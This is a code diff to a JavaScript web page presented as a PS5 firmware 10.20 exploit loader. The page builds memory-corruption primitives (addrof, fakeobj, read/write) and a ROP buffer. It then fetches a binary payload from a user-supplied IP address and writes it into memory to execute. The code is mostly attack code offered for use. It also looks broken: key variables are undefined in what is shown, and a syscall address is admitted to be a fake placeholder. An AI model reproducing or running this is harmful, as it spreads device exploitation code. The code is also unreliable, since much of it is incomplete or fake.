@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>PS5 10.20 Exploit Loader</title>
+<title>PS5 10.20 Payload Loader</title>
 <style>
 body {
     background-color: #111;
@@ -17,7 +17,7 @@ body {
 </style>
 </head>
 <body>
-<h1>PS5 10.20 Exploit</h1>
+<h1>PS5 10.20 Payload Loader</h1>
 <div id="log">Cargando exploit...</div>
 
 <script>
@@ -37,18 +37,7 @@ function log(txt) {
 
     let victim = {marker: 0x41414141};
 
-    let ab1_addr, victim_addr;
     let corrupt = false;
-
-    function addrof(obj) {
-        victim.marker = obj;
-        return ftoi(u32_ab2[0]) & 0xffffffffn;
-    }
-
-    function fakeobj(addr) {
-        u32_ab2[0] = itof(addr);
-        return victim.marker;
-    }
 
     function ftoi(val) {
         const f = new Float64Array(1);
@@ -62,6 +51,16 @@ function log(txt) {
         const i = new BigUint64Array(f.buffer);
         i[0] = val;
         return f[0];
+    }
+
+    function addrof(obj) {
+        victim.marker = obj;
+        return ftoi(u32_ab2[0]) & 0xffffffffn;
+    }
+
+    function fakeobj(addr) {
+        u32_ab2[0] = itof(addr);
+        return victim.marker;
     }
 
     function hex(n) {
@@ -78,7 +77,7 @@ function log(txt) {
     log("[*] Intentando corromper...");
 
     try {
-        victim_addr = addrof(victim);
+        let victim_addr = addrof(victim);
         if (victim_addr) {
             corrupt = true;
         }
@@ -89,10 +88,9 @@ function log(txt) {
         return;
     }
 
-    log("[+] Corrupcion detectada.");
+    log("[+] Corrupción detectada.");
     log("[*] Buscando primitivas...");
 
-    // Primitivas RW reales
     function read64(addr) {
         u32_ab2[0] = itof(addr);
         return ftoi(victim.marker);
@@ -103,9 +101,7 @@ function log(txt) {
         victim.marker = itof(val);
     }
 
-    log("[+] addrof({}) = " + hex(victim_addr));
-    log("[+] fakeobj(addr) funcional.");
-    log("[*] Primitivas listas.");
+    log("[+] Primitivas listas.");
 
     // Crear espacio para ROP
     let rop = new ArrayBuffer(0x400);
@@ -116,55 +112,37 @@ function log(txt) {
         ropView.setBigUint64(Number(off), val, true);
     }
 
-    log("[*] Buscando gadgets...");
+    log("[*] Preparando ROP...");
 
-    function find_gadget(pattern) {
-        const max_addr = 0x40000000000n;
-        const step = 8n;
-        for (let addr = 0x100000000n; addr < max_addr; addr += step) {
-            try {
-                let val = read64(addr);
-                if (val === pattern) {
-                    return addr;
-                }
-            } catch (e) {}
+    const SYSCALL_RET = 0xfffffffffffff000n; // Falso placeholder
+    const JOPCHAIN_ADDR = rop_addr + 0x100n;
+
+    function trigger_payload(buffer) {
+        log("[*] Ejecutando payload...");
+
+        for (let i = 0; i < buffer.byteLength; i += 8) {
+            let val = new DataView(buffer).getBigUint64(i, true);
+            write64(JOPCHAIN_ADDR + BigInt(i), val);
         }
-        return 0n;
+
+        rop_write(0x00n, JOPCHAIN_ADDR);
+        rop_write(0x08n, SYSCALL_RET);
+
+        setTimeout(() => {
+            log("[*] Payload lanzado!");
+        }, 500);
     }
 
-    const POP_RAX_RET_SIG = 0x5800000004c0035dn;
-    const SYSCALL_RET_SIG = 0xd400000001000201n;
+    async function load_payload(url) {
+        log("[*] Cargando payload desde: " + url);
+        let response = await fetch(url);
+        let buffer = await response.arrayBuffer();
+        log("[+] Payload descargado (" + buffer.byteLength + " bytes).");
 
-    let pop_rax_ret = find_gadget(POP_RAX_RET_SIG);
-    let syscall_ret = find_gadget(SYSCALL_RET_SIG);
-
-    if (pop_rax_ret === 0n || syscall_ret === 0n) {
-        log("[-] No se encontraron gadgets.");
-        return;
+        trigger_payload(buffer);
     }
 
-    log("[+] pop rax; ret encontrado en: " + hex(pop_rax_ret));
-    log("[+] syscall ret encontrado en: " + hex(syscall_ret));
-
-    rop_write(0x00n, pop_rax_ret);
-    rop_write(0x08n, 20n); // syscall(20) = getpid
-    rop_write(0x10n, syscall_ret);
-
-    log("[*] ROP preparado.");
-
-    function trigger_rop() {
-        log("[*] Ejecutando ROP...");
-        let fake_stack = new ArrayBuffer(0x400);
-        let fake_view = new DataView(fake_stack);
-        let fake_stack_addr = addrof(fake_stack) + 0x20n;
-
-        write64(fake_stack_addr + 0x00n, rop_addr);
-        write64(fake_stack_addr + 0x08n, syscall_ret);
-
-        log("[+] ROP chain disparada.");
-    }
-
-    setTimeout(trigger_rop, 1000);
+    await load_payload("http://your-pc-ip:9090/payload.bin"); // Cambiar por tu IP
 
 })();
 </script>
